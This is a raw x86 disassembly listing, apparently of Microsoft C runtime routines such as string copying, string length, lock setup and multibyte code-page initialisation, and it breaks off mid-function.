  4255a4:	jmp    0x4255eb
  4255a6:	push   0xa
  4255a8:	call   0x4255ef
  4255ad:	cmp    DWORD PTR [esi],0x0
  4255b0:	pop    ecx
  4255b1:	jne    0x4255d9
  4255b3:	push   0xfa0
  4255b8:	push   edi
  4255b9:	call   0x4264bd
  4255be:	test   eax,eax
  4255c0:	pop    ecx
  4255c1:	pop    ecx
  4255c2:	jne    0x4255d5
  4255c4:	push   edi
  4255c5:	call   0x42603a
  4255ca:	push   0xa
  4255cc:	call   0x42555b
  4255d1:	pop    ecx
  4255d2:	pop    ecx
  4255d3:	jmp    0x425597
  4255d5:	mov    DWORD PTR [esi],edi
  4255d7:	jmp    0x4255e0
  4255d9:	push   edi
  4255da:	call   0x42603a
  4255df:	pop    ecx
  4255e0:	push   0xa
  4255e2:	call   0x42555b
  4255e7:	xor    eax,eax
  4255e9:	pop    ecx
  4255ea:	inc    eax
  4255eb:	pop    edi
  4255ec:	pop    esi
  4255ed:	pop    ebp
  4255ee:	ret    
  4255ef:	push   ebp
  4255f0:	mov    ebp,esp
  4255f2:	mov    eax,DWORD PTR [ebp+0x8]
  4255f5:	push   esi
  4255f6:	lea    esi,[eax*8+0x462e10]
  4255fd:	cmp    DWORD PTR [esi],0x0
  425600:	jne    0x425615
  425602:	push   eax
  425603:	call   0x425570
  425608:	test   eax,eax
  42560a:	pop    ecx
  42560b:	jne    0x425615
  42560d:	push   0x11
  42560f:	call   0x4244fc
  425614:	pop    ecx
  425615:	push   DWORD PTR [esi]
  425617:	call   DWORD PTR ds:0x4290f4
  42561d:	pop    esi
  42561e:	pop    ebp
  42561f:	ret    
  425620:	push   esi
  425621:	push   DWORD PTR ds:0x463d68
  425627:	call   0x427586
  42562c:	pop    ecx
  42562d:	mov    ecx,DWORD PTR ds:0x463d64
  425633:	mov    esi,eax
  425635:	mov    eax,ds:0x463d68
  42563a:	mov    edx,ecx
  42563c:	sub    edx,eax
  42563e:	add    edx,0x4
  425641:	cmp    esi,edx
  425643:	jae    0x425693
  425645:	mov    ecx,0x800
  42564a:	cmp    esi,ecx
  42564c:	jae    0x425650
  42564e:	mov    ecx,esi
  425650:	add    ecx,esi
  425652:	push   ecx
  425653:	push   eax
  425654:	call   0x4273d9
  425659:	test   eax,eax
  42565b:	pop    ecx
  42565c:	pop    ecx
  42565d:	jne    0x425676
  42565f:	add    esi,0x10
  425662:	push   esi
  425663:	push   DWORD PTR ds:0x463d68
  425669:	call   0x4273d9
  42566e:	test   eax,eax
  425670:	pop    ecx
  425671:	pop    ecx
  425672:	jne    0x425676
  425674:	pop    esi
  425675:	ret    
  425676:	mov    ecx,DWORD PTR ds:0x463d64
  42567c:	sub    ecx,DWORD PTR ds:0x463d68
  425682:	mov    ds:0x463d68,eax
  425687:	sar    ecx,0x2
  42568a:	lea    ecx,[eax+ecx*4]
  42568d:	mov    DWORD PTR ds:0x463d64,ecx
  425693:	mov    DWORD PTR [ecx],edi
  425695:	add    DWORD PTR ds:0x463d64,0x4
  42569c:	mov    eax,edi
  42569e:	pop    esi
  42569f:	ret    
  4256a0:	push   0x80
  4256a5:	call   0x426152
  4256aa:	test   eax,eax
  4256ac:	pop    ecx
  4256ad:	mov    ds:0x463d68,eax
  4256b2:	jne    0x4256b8
  4256b4:	push   0x18
  4256b6:	pop    eax
  4256b7:	ret    
  4256b8:	and    DWORD PTR [eax],0x0
  4256bb:	mov    eax,ds:0x463d68
  4256c0:	mov    ds:0x463d64,eax
  4256c5:	xor    eax,eax
  4256c7:	ret    
  4256c8:	push   0xc
  4256ca:	push   0x429618
  4256cf:	call   0x425434
  4256d4:	call   0x424747
  4256d9:	and    DWORD PTR [ebp-0x4],0x0
  4256dd:	mov    edi,DWORD PTR [ebp+0x8]
  4256e0:	call   0x425620
  4256e5:	mov    DWORD PTR [ebp-0x1c],eax
  4256e8:	or     DWORD PTR [ebp-0x4],0xffffffff
  4256ec:	call   0x4256fa
  4256f1:	mov    eax,DWORD PTR [ebp-0x1c]
  4256f4:	call   0x42546f
  4256f9:	ret    
  4256fa:	call   0x424750
  4256ff:	ret    
  425700:	push   DWORD PTR [esp+0x4]
  425704:	call   0x4256c8
  425709:	neg    eax
  42570b:	sbb    eax,eax
  42570d:	neg    eax
  42570f:	pop    ecx
  425710:	dec    eax
  425711:	ret    
  425712:	push   ebp
  425713:	mov    ebp,esp
  425715:	sub    esp,0x10
  425718:	push   ebx
  425719:	xor    ebx,ebx
  42571b:	cmp    DWORD PTR ds:0x463870,ebx
  425721:	push   esi
  425722:	push   edi
  425723:	jne    0x425792
  425725:	push   0x429688
  42572a:	call   DWORD PTR ds:0x4290f8
  425730:	mov    edi,eax
  425732:	cmp    edi,ebx
  425734:	je     0x4257cd
  42573a:	mov    esi,DWORD PTR ds:0x429028
  425740:	push   0x42967c
  425745:	push   edi
  425746:	call   esi
  425748:	test   eax,eax
  42574a:	mov    ds:0x463870,eax
  42574f:	je     0x4257cd
  425751:	push   0x42966c
  425756:	push   edi
  425757:	call   esi
  425759:	push   0x429658
  42575e:	push   edi
  42575f:	mov    ds:0x463874,eax
  425764:	call   esi
  425766:	cmp    DWORD PTR ds:0x4635c4,0x2
  42576d:	mov    ds:0x463878,eax
  425772:	jne    0x425792
  425774:	push   0x42963c
  425779:	push   edi
  42577a:	call   esi
  42577c:	test   eax,eax
  42577e:	mov    ds:0x463880,eax
  425783:	je     0x425792
  425785:	push   0x429624
  42578a:	push   edi
  42578b:	call   esi
  42578d:	mov    ds:0x46387c,eax
  425792:	mov    eax,ds:0x46387c
  425797:	test   eax,eax
  425799:	je     0x4257d7
  42579b:	call   eax
  42579d:	test   eax,eax
  42579f:	je     0x4257be
  4257a1:	lea    ecx,[ebp-0x4]
  4257a4:	push   ecx
  4257a5:	push   0xc
  4257a7:	lea    ecx,[ebp-0x10]
  4257aa:	push   ecx
  4257ab:	push   0x1
  4257ad:	push   eax
  4257ae:	call   DWORD PTR ds:0x463880
  4257b4:	test   eax,eax
  4257b6:	je     0x4257be
  4257b8:	test   BYTE PTR [ebp-0x8],0x1
  4257bc:	jne    0x4257d7
  4257be:	cmp    DWORD PTR ds:0x4635d0,0x4
  4257c5:	jb     0x4257d1
  4257c7:	or     BYTE PTR [ebp+0x12],0x20
  4257cb:	jmp    0x4257f6
  4257cd:	xor    eax,eax
  4257cf:	jmp    0x425806
  4257d1:	or     BYTE PTR [ebp+0x12],0x4
  4257d5:	jmp    0x4257f6
  4257d7:	mov    eax,ds:0x463874
  4257dc:	test   eax,eax
  4257de:	je     0x4257f6
  4257e0:	call   eax
  4257e2:	mov    ebx,eax
  4257e4:	test   ebx,ebx
  4257e6:	je     0x4257f6
  4257e8:	mov    eax,ds:0x463878
  4257ed:	test   eax,eax
  4257ef:	je     0x4257f6
  4257f1:	push   ebx
  4257f2:	call   eax
  4257f4:	mov    ebx,eax
  4257f6:	push   DWORD PTR [ebp+0x10]
  4257f9:	push   DWORD PTR [ebp+0xc]
  4257fc:	push   DWORD PTR [ebp+0x8]
  4257ff:	push   ebx
  425800:	call   DWORD PTR ds:0x463870
  425806:	pop    edi
  425807:	pop    esi
  425808:	pop    ebx
  425809:	leave  
  42580a:	ret    
  42580b:	int3   
  42580c:	int3   
  42580d:	int3   
  42580e:	int3   
  42580f:	int3   
  425810:	push   edi
  425811:	mov    edi,DWORD PTR [esp+0x8]
  425815:	jmp    0x425885
  425817:	lea    esp,[esp+0x0]
  42581e:	mov    edi,edi
  425820:	mov    ecx,DWORD PTR [esp+0x4]
  425824:	push   edi
  425825:	test   ecx,0x3
  42582b:	je     0x425840
  42582d:	mov    al,BYTE PTR [ecx]
  42582f:	add    ecx,0x1
  425832:	test   al,al
  425834:	je     0x425873
  425836:	test   ecx,0x3
  42583c:	jne    0x42582d
  42583e:	mov    edi,edi
  425840:	mov    eax,DWORD PTR [ecx]
  425842:	mov    edx,0x7efefeff
  425847:	add    edx,eax
  425849:	xor    eax,0xffffffff
  42584c:	xor    eax,edx
  42584e:	add    ecx,0x4
  425851:	test   eax,0x81010100
  425856:	je     0x425840
  425858:	mov    eax,DWORD PTR [ecx-0x4]
  42585b:	test   al,al
  42585d:	je     0x425882
  42585f:	test   ah,ah
  425861:	je     0x42587d
  425863:	test   eax,0xff0000
  425868:	je     0x425878
  42586a:	test   eax,0xff000000
  42586f:	je     0x425873
  425871:	jmp    0x425840
  425873:	lea    edi,[ecx-0x1]
  425876:	jmp    0x425885
  425878:	lea    edi,[ecx-0x2]
  42587b:	jmp    0x425885
  42587d:	lea    edi,[ecx-0x3]
  425880:	jmp    0x425885
  425882:	lea    edi,[ecx-0x4]
  425885:	mov    ecx,DWORD PTR [esp+0xc]
  425889:	test   ecx,0x3
  42588f:	je     0x4258ae
  425891:	mov    dl,BYTE PTR [ecx]
  425893:	add    ecx,0x1
  425896:	test   dl,dl
  425898:	je     0x425900
  42589a:	mov    BYTE PTR [edi],dl
  42589c:	add    edi,0x1
  42589f:	test   ecx,0x3
  4258a5:	jne    0x425891
  4258a7:	jmp    0x4258ae
  4258a9:	mov    DWORD PTR [edi],edx
  4258ab:	add    edi,0x4
  4258ae:	mov    edx,0x7efefeff
  4258b3:	mov    eax,DWORD PTR [ecx]
  4258b5:	add    edx,eax
  4258b7:	xor    eax,0xffffffff
  4258ba:	xor    eax,edx
  4258bc:	mov    edx,DWORD PTR [ecx]
  4258be:	add    ecx,0x4
  4258c1:	test   eax,0x81010100
  4258c6:	je     0x4258a9
  4258c8:	test   dl,dl
  4258ca:	je     0x425900
  4258cc:	test   dh,dh
  4258ce:	je     0x4258f7
  4258d0:	test   edx,0xff0000
  4258d6:	je     0x4258ea
  4258d8:	test   edx,0xff000000
  4258de:	je     0x4258e2
  4258e0:	jmp    0x4258a9
  4258e2:	mov    DWORD PTR [edi],edx
  4258e4:	mov    eax,DWORD PTR [esp+0x8]
  4258e8:	pop    edi
  4258e9:	ret    
  4258ea:	mov    WORD PTR [edi],dx
  4258ed:	mov    eax,DWORD PTR [esp+0x8]
  4258f1:	mov    BYTE PTR [edi+0x2],0x0
  4258f5:	pop    edi
  4258f6:	ret    
  4258f7:	mov    WORD PTR [edi],dx
  4258fa:	mov    eax,DWORD PTR [esp+0x8]
  4258fe:	pop    edi
  4258ff:	ret    
  425900:	mov    BYTE PTR [edi],dl
  425902:	mov    eax,DWORD PTR [esp+0x8]
  425906:	pop    edi
  425907:	ret    
  425908:	int3   
  425909:	int3   
  42590a:	int3   
  42590b:	int3   
  42590c:	int3   
  42590d:	int3   
  42590e:	int3   
  42590f:	int3   
  425910:	mov    ecx,DWORD PTR [esp+0xc]
  425914:	push   edi
  425915:	test   ecx,ecx
  425917:	je     0x4259af
  42591d:	push   esi
  42591e:	push   ebx
  42591f:	mov    ebx,ecx
  425921:	mov    esi,DWORD PTR [esp+0x14]
  425925:	test   esi,0x3
  42592b:	mov    edi,DWORD PTR [esp+0x10]
  42592f:	jne    0x42593c
  425931:	shr    ecx,0x2
  425934:	jne    0x4259bf
  42593a:	jmp    0x425963
  42593c:	mov    al,BYTE PTR [esi]
  42593e:	add    esi,0x1
  425941:	mov    BYTE PTR [edi],al
  425943:	add    edi,0x1
  425946:	sub    ecx,0x1
  425949:	je     0x425976
  42594b:	test   al,al
  42594d:	je     0x42597e
  42594f:	test   esi,0x3
  425955:	jne    0x42593c
  425957:	mov    ebx,ecx
  425959:	shr    ecx,0x2
  42595c:	jne    0x4259bf
  42595e:	and    ebx,0x3
  425961:	je     0x425976
  425963:	mov    al,BYTE PTR [esi]
  425965:	add    esi,0x1
  425968:	mov    BYTE PTR [edi],al
  42596a:	add    edi,0x1
  42596d:	test   al,al
  42596f:	je     0x4259a8
  425971:	sub    ebx,0x1
  425974:	jne    0x425963
  425976:	mov    eax,DWORD PTR [esp+0x10]
  42597a:	pop    ebx
  42597b:	pop    esi
  42597c:	pop    edi
  42597d:	ret    
  42597e:	test   edi,0x3
  425984:	je     0x42599c
  425986:	mov    BYTE PTR [edi],al
  425988:	add    edi,0x1
  42598b:	sub    ecx,0x1
  42598e:	je     0x425a2c
  425994:	test   edi,0x3
  42599a:	jne    0x425986
  42599c:	mov    ebx,ecx
  42599e:	shr    ecx,0x2
  4259a1:	jne    0x425a17
  4259a3:	mov    BYTE PTR [edi],al
  4259a5:	add    edi,0x1
  4259a8:	sub    ebx,0x1
  4259ab:	jne    0x4259a3
  4259ad:	pop    ebx
  4259ae:	pop    esi
  4259af:	mov    eax,DWORD PTR [esp+0x8]
  4259b3:	pop    edi
  4259b4:	ret    
  4259b5:	mov    DWORD PTR [edi],edx
  4259b7:	add    edi,0x4
  4259ba:	sub    ecx,0x1
  4259bd:	je     0x42595e
  4259bf:	mov    edx,0x7efefeff
  4259c4:	mov    eax,DWORD PTR [esi]
  4259c6:	add    edx,eax
  4259c8:	xor    eax,0xffffffff
  4259cb:	xor    eax,edx
  4259cd:	mov    edx,DWORD PTR [esi]
  4259cf:	add    esi,0x4
  4259d2:	test   eax,0x81010100
  4259d7:	je     0x4259b5
  4259d9:	test   dl,dl
  4259db:	je     0x425a09
  4259dd:	test   dh,dh
  4259df:	je     0x4259ff
  4259e1:	test   edx,0xff0000
  4259e7:	je     0x4259f5
  4259e9:	test   edx,0xff000000
  4259ef:	jne    0x4259b5
  4259f1:	mov    DWORD PTR [edi],edx
  4259f3:	jmp    0x425a0d
  4259f5:	and    edx,0xffff
  4259fb:	mov    DWORD PTR [edi],edx
  4259fd:	jmp    0x425a0d
  4259ff:	and    edx,0xff
  425a05:	mov    DWORD PTR [edi],edx
  425a07:	jmp    0x425a0d
  425a09:	xor    edx,edx
  425a0b:	mov    DWORD PTR [edi],edx
  425a0d:	add    edi,0x4
  425a10:	xor    eax,eax
  425a12:	sub    ecx,0x1
  425a15:	je     0x425a23
  425a17:	xor    eax,eax
  425a19:	mov    DWORD PTR [edi],eax
  425a1b:	add    edi,0x4
  425a1e:	sub    ecx,0x1
  425a21:	jne    0x425a19
  425a23:	and    ebx,0x3
  425a26:	jne    0x4259a3
  425a2c:	mov    eax,DWORD PTR [esp+0x10]
  425a30:	pop    ebx
  425a31:	pop    esi
  425a32:	pop    edi
  425a33:	ret    
  425a34:	int3   
  425a35:	int3   
  425a36:	int3   
  425a37:	int3   
  425a38:	int3   
  425a39:	int3   
  425a3a:	int3   
  425a3b:	int3   
  425a3c:	int3   
  425a3d:	int3   
  425a3e:	int3   
  425a3f:	int3   
  425a40:	mov    ecx,DWORD PTR [esp+0x4]
  425a44:	test   ecx,0x3
  425a4a:	je     0x425a70
  425a4c:	mov    al,BYTE PTR [ecx]
  425a4e:	add    ecx,0x1
  425a51:	test   al,al
  425a53:	je     0x425aa3
  425a55:	test   ecx,0x3
  425a5b:	jne    0x425a4c
  425a5d:	add    eax,0x0
  425a62:	lea    esp,[esp+0x0]
  425a69:	lea    esp,[esp+0x0]
  425a70:	mov    eax,DWORD PTR [ecx]
  425a72:	mov    edx,0x7efefeff
  425a77:	add    edx,eax
  425a79:	xor    eax,0xffffffff
  425a7c:	xor    eax,edx
  425a7e:	add    ecx,0x4
  425a81:	test   eax,0x81010100
  425a86:	je     0x425a70
  425a88:	mov    eax,DWORD PTR [ecx-0x4]
  425a8b:	test   al,al
  425a8d:	je     0x425ac1
  425a8f:	test   ah,ah
  425a91:	je     0x425ab7
  425a93:	test   eax,0xff0000
  425a98:	je     0x425aad
  425a9a:	test   eax,0xff000000
  425a9f:	je     0x425aa3
  425aa1:	jmp    0x425a70
  425aa3:	lea    eax,[ecx-0x1]
  425aa6:	mov    ecx,DWORD PTR [esp+0x4]
  425aaa:	sub    eax,ecx
  425aac:	ret    
  425aad:	lea    eax,[ecx-0x2]
  425ab0:	mov    ecx,DWORD PTR [esp+0x4]
  425ab4:	sub    eax,ecx
  425ab6:	ret    
  425ab7:	lea    eax,[ecx-0x3]
  425aba:	mov    ecx,DWORD PTR [esp+0x4]
  425abe:	sub    eax,ecx
  425ac0:	ret    
  425ac1:	lea    eax,[ecx-0x4]
  425ac4:	mov    ecx,DWORD PTR [esp+0x4]
  425ac8:	sub    eax,ecx
  425aca:	ret    
  425acb:	push   0x8
  425acd:	push   0x429698
  425ad2:	call   0x425434
  425ad7:	and    DWORD PTR [ebp-0x4],0x0
  425adb:	push   0x0
  425add:	push   0x1
  425adf:	call   0x427652
  425ae4:	pop    ecx
  425ae5:	pop    ecx
  425ae6:	jmp    0x425aef
  425ae8:	xor    eax,eax
  425aea:	inc    eax
  425aeb:	ret    
  425aec:	mov    esp,DWORD PTR [ebp-0x18]
  425aef:	or     DWORD PTR [ebp-0x4],0xffffffff
  425af3:	push   0x3
  425af5:	call   DWORD PTR ds:0x42909c
  425afb:	int3   
  425afc:	cmp    ecx,DWORD PTR ds:0x462f30
  425b02:	jne    0x425b05
  425b04:	ret    
  425b05:	jmp    0x425acb
  425b0a:	movzx  eax,BYTE PTR [esp+0x4]
  425b0f:	mov    cl,BYTE PTR [esp+0xc]
  425b13:	test   BYTE PTR [eax+0x463a21],cl
  425b19:	jne    0x425b37
  425b1b:	cmp    DWORD PTR [esp+0x8],0x0
  425b20:	je     0x425b30
  425b22:	movzx  eax,WORD PTR [eax*2+0x429a92]
  425b2a:	and    eax,DWORD PTR [esp+0x8]
  425b2e:	jmp    0x425b32
  425b30:	xor    eax,eax
  425b32:	test   eax,eax
  425b34:	jne    0x425b37
  425b36:	ret    
  425b37:	xor    eax,eax
  425b39:	inc    eax
  425b3a:	ret    
  425b3b:	push   0x4
  425b3d:	push   0x0
  425b3f:	push   DWORD PTR [esp+0xc]
  425b43:	call   0x425b0a
  425b48:	add    esp,0xc
  425b4b:	ret    
  425b4c:	sub    eax,0x3a4
  425b51:	je     0x425b75
  425b53:	sub    eax,0x4
  425b56:	je     0x425b6f
  425b58:	sub    eax,0xd
  425b5b:	je     0x425b69
  425b5d:	dec    eax
  425b5e:	je     0x425b63
  425b60:	xor    eax,eax
  425b62:	ret    
  425b63:	mov    eax,0x404
  425b68:	ret    
  425b69:	mov    eax,0x412
  425b6e:	ret    
  425b6f:	mov    eax,0x804
  425b74:	ret    
  425b75:	mov    eax,0x411
  425b7a:	ret    
  425b7b:	push   edi
  425b7c:	push   0x40
  425b7e:	xor    eax,eax
  425b80:	pop    ecx
  425b81:	mov    edi,0x463a20
  425b86:	rep stos DWORD PTR es:[edi],eax
  425b88:	stos   BYTE PTR es:[edi],al
  425b89:	xor    eax,eax
  425b8b:	mov    ds:0x463b24,eax
  425b90:	mov    ds:0x463a1c,eax
  425b95:	mov    ds:0x463a14,eax
  425b9a:	mov    edi,0x463b30
  425b9f:	stos   DWORD PTR es:[edi],eax
  425ba0:	stos   DWORD PTR es:[edi],eax
  425ba1:	stos   DWORD PTR es:[edi],eax
  425ba2:	pop    edi
  425ba3:	ret    
  425ba4:	push   ebp
  425ba5:	mov    ebp,esp
  425ba7:	sub    esp,0x518
  425bad:	mov    eax,ds:0x462f30
  425bb2:	xor    eax,DWORD PTR [ebp+0x4]
  425bb5:	push   esi
  425bb6:	mov    DWORD PTR [ebp-0x4],eax
  425bb9:	lea    eax,[ebp-0x18]
  425bbc:	push   eax
  425bbd:	push   DWORD PTR ds:0x463b24
  425bc3:	call   DWORD PTR ds:0x429104
  425bc9:	cmp    eax,0x1
  425bcc:	mov    esi,0x100
  425bd1:	jne    0x425ce4
  425bd7:	xor    eax,eax
  425bd9:	mov    BYTE PTR [ebp+eax*1-0x118],al
  425be0:	inc    eax
  425be1:	cmp    eax,esi
  425be3:	jb     0x425bd9
  425be5:	mov    al,BYTE PTR [ebp-0x12]
  425be8:	test   al,al
  425bea:	mov    BYTE PTR [ebp-0x118],0x20
  425bf1:	je     0x425c29
  425bf3:	push   ebx
  425bf4:	lea    edx,[ebp-0x11]
  425bf7:	push   edi
  425bf8:	movzx  ecx,BYTE PTR [edx]
  425bfb:	movzx  eax,al
  425bfe:	cmp    eax,ecx
  425c00:	ja     0x425c1f
  425c02:	sub    ecx,eax
  425c04:	inc    ecx
  425c05:	mov    ebx,ecx
  425c07:	shr    ecx,0x2
  425c0a:	lea    edi,[ebp+eax*1-0x118]
  425c11:	mov    eax,0x20202020
  425c16:	rep stos DWORD PTR es:[edi],eax
  425c18:	mov    ecx,ebx
  425c1a:	and    ecx,0x3
  425c1d:	rep stos BYTE PTR es:[edi],al
  425c1f:	inc    edx
  425c20:	mov    al,BYTE PTR [edx]
  425c22:	inc    edx
  425c23:	test   al,al
  425c25:	jne    0x425bf8
  425c27:	pop    edi
  425c28:	pop    ebx
  425c29:	push   0x0
  425c2b:	push   DWORD PTR ds:0x463a14
  425c31:	lea    eax,[ebp-0x518]
  425c37:	push   DWORD PTR ds:0x463b24
  425c3d:	push   eax
  425c3e:	push   esi
  425c3f:	lea    eax,[ebp-0x118]
  425c45:	push   eax
  425c46:	push   0x1
  425c48:	call   0x427b58
  425c4d:	push   0x0
  425c4f:	push   DWORD PTR ds:0x463b24
  425c55:	lea    eax,[ebp-0x218]
  425c5b:	push   esi
  425c5c:	push   eax
  425c5d:	push   esi
  425c5e:	lea    eax,[ebp-0x118]
  425c64:	push   eax
  425c65:	push   esi
  425c66:	push   DWORD PTR ds:0x463a14
  425c6c:	call   0x42779c
  425c71:	push   0x0
  425c73:	push   DWORD PTR ds:0x463b24
  425c79:	lea    eax,[ebp-0x318]
  425c7f:	push   esi
  425c80:	push   eax
  425c81:	push   esi
  425c82:	lea    eax,[ebp-0x118]
  425c88:	push   eax
  425c89:	push   0x200
  425c8e:	push   DWORD PTR ds:0x463a14
  425c94:	call   0x42779c
  425c99:	add    esp,0x5c
  425c9c:	xor    eax,eax
  425c9e:	mov    cx,WORD PTR [ebp+eax*2-0x518]
  425ca6:	test   cl,0x1
  425ca9:	je     0x425cc1
  425cab:	or     BYTE PTR [eax+0x463a21],0x10
  425cb2:	mov    cl,BYTE PTR [ebp+eax*1-0x218]
  425cb9:	mov    BYTE PTR [eax+0x463b40],cl
  425cbf:	jmp    0x425cdd
  425cc1:	test   cl,0x2
  425cc4:	je     0x425cd6
  425cc6:	or     BYTE PTR [eax+0x463a21],0x20
  425ccd:	mov    cl,BYTE PTR [ebp+eax*1-0x318]
  425cd4:	jmp    0x425cb9
  425cd6:	and    BYTE PTR [eax+0x463b40],0x0
  425cdd:	inc    eax
  425cde:	cmp    eax,esi
  425ce0:	jb     0x425c9e
  425ce2:	jmp    0x425d28
  425ce4:	xor    eax,eax
  425ce6:	cmp    eax,0x41
  425ce9:	jb     0x425d04
  425ceb:	cmp    eax,0x5a
  425cee:	ja     0x425d04
  425cf0:	or     BYTE PTR [eax+0x463a21],0x10
  425cf7:	mov    cl,al
  425cf9:	add    cl,0x20
  425cfc:	mov    BYTE PTR [eax+0x463b40],cl
  425d02:	jmp    0x425d23
  425d04:	cmp    eax,0x61
  425d07:	jb     0x425d1c
  425d09:	cmp    eax,0x7a
  425d0c:	ja     0x425d1c
  425d0e:	or     BYTE PTR [eax+0x463a21],0x20
  425d15:	mov    cl,al
  425d17:	sub    cl,0x20
  425d1a:	jmp    0x425cfc
  425d1c:	and    BYTE PTR [eax+0x463b40],0x0
  425d23:	inc    eax
  425d24:	cmp    eax,esi
  425d26:	jb     0x425ce6
  425d28:	mov    ecx,DWORD PTR [ebp-0x4]
  425d2b:	xor    ecx,DWORD PTR [ebp+0x4]
  425d2e:	pop    esi
  425d2f:	call   0x425afc
  425d34:	leave  
  425d35:	ret    
  425d36:	push   ebp
  425d37:	mov    ebp,esp
  425d39:	sub    esp,0x1c
  425d3c:	mov    eax,ds:0x462f30
  425d41:	xor    eax,DWORD PTR [ebp+0x4]
  425d44:	push   ebx
  425d45:	push   esi
  425d46:	mov    esi,DWORD PTR [ebp+0x8]
  425d49:	xor    ebx,ebx
  425d4b:	cmp    esi,ebx
  425d4d:	mov    DWORD PTR [ebp-0x4],eax
  425d50:	push   edi
  425d51:	je     0x425eab
  425d57:	xor    edx,edx
  425d59:	xor    eax,eax
  425d5b:	cmp    DWORD PTR [eax+0x462f40],esi
  425d61:	je     0x425dc8
  425d63:	add    eax,0x30
  425d66:	inc    edx
  425d67:	cmp    eax,0xf0
  425d6c:	jb     0x425d5b
  425d6e:	lea    eax,[ebp-0x1c]
  425d71:	push   eax
  425d72:	push   esi
  425d73:	call   DWORD PTR ds:0x429104
  425d79:	cmp    eax,0x1
  425d7c:	jne    0x425ea3
  425d82:	push   0x40
  425d84:	xor    eax,eax
  425d86:	cmp    DWORD PTR [ebp-0x1c],0x1
  425d8a:	pop    ecx
  425d8b:	mov    edi,0x463a20
  425d90:	rep stos DWORD PTR es:[edi],eax
  425d92:	stos   BYTE PTR es:[edi],al
  425d93:	mov    DWORD PTR ds:0x463b24,esi
  425d99:	mov    DWORD PTR ds:0x463a14,ebx
  425d9f:	jbe    0x425e91
  425da5:	cmp    BYTE PTR [ebp-0x16],0x0
  425da9:	je     0x425e69
  425daf:	lea    ecx,[ebp-0x15]
  425db2:	mov    dl,BYTE PTR [ecx]
  425db4:	test   dl,dl
  425db6:	je     0x425e69
  425dbc:	movzx  eax,BYTE PTR [ecx-0x1]
  425dc0:	movzx  edx,dl
  425dc3:	jmp    0x425e59
  425dc8:	push   0x40
  425dca:	xor    eax,eax
  425dcc:	pop    ecx
  425dcd:	mov    edi,0x463a20
  425dd2:	rep stos DWORD PTR es:[edi],eax
  425dd4:	lea    ecx,[edx+edx*2]
  425dd7:	shl    ecx,0x4
  425dda:	mov    DWORD PTR [ebp-0x8],ebx
  425ddd:	stos   BYTE PTR es:[edi],al
  425dde:	lea    ebx,[ecx+0x462f50]
  425de4:	mov    al,BYTE PTR [ebx]
  425de6:	mov    esi,ebx
  425de8:	jmp    0x425e13
  425dea:	mov    dl,BYTE PTR [esi+0x1]
  425ded:	test   dl,dl
  425def:	je     0x425e17
  425df1:	movzx  eax,al
  425df4:	movzx  edi,dl
  425df7:	cmp    eax,edi
  425df9:	ja     0x425e0f
  425dfb:	mov    edx,DWORD PTR [ebp-0x8]
  425dfe:	mov    dl,BYTE PTR [edx+0x462f38]
  425e04:	or     BYTE PTR [eax+0x463a21],dl
  425e0a:	inc    eax
  425e0b:	cmp    eax,edi
  425e0d:	jbe    0x425e04
  425e0f:	inc    esi
  425e10:	inc    esi
  425e11:	mov    al,BYTE PTR [esi]
  425e13:	test   al,al
  425e15:	jne    0x425dea
  425e17:	inc    DWORD PTR [ebp-0x8]
  425e1a:	add    ebx,0x8
  425e1d:	cmp    DWORD PTR [ebp-0x8],0x4
  425e21:	jb     0x425de4
  425e23:	mov    eax,DWORD PTR [ebp+0x8]
  425e26:	mov    ds:0x463b24,eax
  425e2b:	mov    DWORD PTR ds:0x463a1c,0x1
  425e35:	call   0x425b4c
  425e3a:	lea    ecx,[ecx+0x462f44]
  425e40:	mov    esi,ecx
  425e42:	mov    edi,0x463b30
  425e47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425e48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425e49:	mov    ds:0x463a14,eax
  425e4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425e4f:	jmp    0x425eb0
  425e51:	or     BYTE PTR [eax+0x463a21],0x4
  425e58:	inc    eax
  425e59:	cmp    eax,edx
  425e5b:	jbe    0x425e51
  425e5d:	inc    ecx
  425e5e:	inc    ecx
  425e5f:	cmp    BYTE PTR [ecx-0x1],0x0
  425e63:	jne    0x425db2
  425e69:	xor    ecx,ecx
  425e6b:	inc    ecx
  425e6c:	mov    eax,ecx
  425e6e:	or     BYTE PTR [eax+0x463a21],0x8
  425e75:	inc    eax
  425e76:	cmp    eax,0xff
  425e7b:	jb     0x425e6e
  425e7d:	mov    eax,esi
  425e7f:	call   0x425b4c
  425e84:	mov    ds:0x463a14,eax
  425e89:	mov    DWORD PTR ds:0x463a1c,ecx
  425e8f:	jmp    0x425e97
  425e91:	mov    DWORD PTR ds:0x463a1c,ebx
  425e97:	xor    eax,eax
  425e99:	mov    edi,0x463b30
  425e9e:	stos   DWORD PTR es:[edi],eax
  425e9f:	stos   DWORD PTR es:[edi],eax
  425ea0:	stos   DWORD PTR es:[edi],eax
  425ea1:	jmp    0x425eb0
  425ea3:	cmp    DWORD PTR ds:0x463884,ebx
  425ea9:	je     0x425eb9
  425eab:	call   0x425b7b
  425eb0:	call   0x425ba4
  425eb5:	xor    eax,eax
  425eb7:	jmp    0x425ebc
  425eb9:	or     eax,0xffffffff
  425ebc:	mov    ecx,DWORD PTR [ebp-0x4]
  425ebf:	xor    ecx,DWORD PTR [ebp+0x4]
  425ec2:	pop    edi
  425ec3:	pop    esi
  425ec4:	pop    ebx
  425ec5:	call   0x425afc
  425eca:	leave  
  425ecb:	ret    
  425ecc:	push   0x14
  425ece:	push   0x4296a8
  425ed3:	call   0x425434
  425ed8:	or     DWORD PTR [ebp-0x1c],0xffffffff
  425edc:	push   0xd
  425ede:	call   0x4255ef
  425ee3:	pop    ecx
  425ee4:	xor    edi,edi
  425ee6:	mov    DWORD PTR [ebp-0x4],edi
  425ee9:	mov    DWORD PTR ds:0x463884,edi
  425eef:	mov    eax,DWORD PTR [ebp+0x8]
  425ef2:	cmp    eax,0xfffffffe
  425ef5:	jne    0x425f09
  425ef7:	mov    DWORD PTR ds:0x463884,0x1
  425f01:	call   DWORD PTR ds:0x429100
  425f07:	jmp    0x425f34
  425f09:	cmp    eax,0xfffffffd
  425f0c:	jne    0x425f20
  425f0e:	mov    DWORD PTR ds:0x463884,0x1
  425f18:	call   DWORD PTR ds:0x4290fc
  425f1e:	jmp    0x425f34
  425f20:	cmp    eax,0xfffffffc
  425f23:	jne    0x425f34
  425f25:	mov    DWORD PTR ds:0x463884,0x1
  425f2f:	mov    eax,ds:0x4638b4
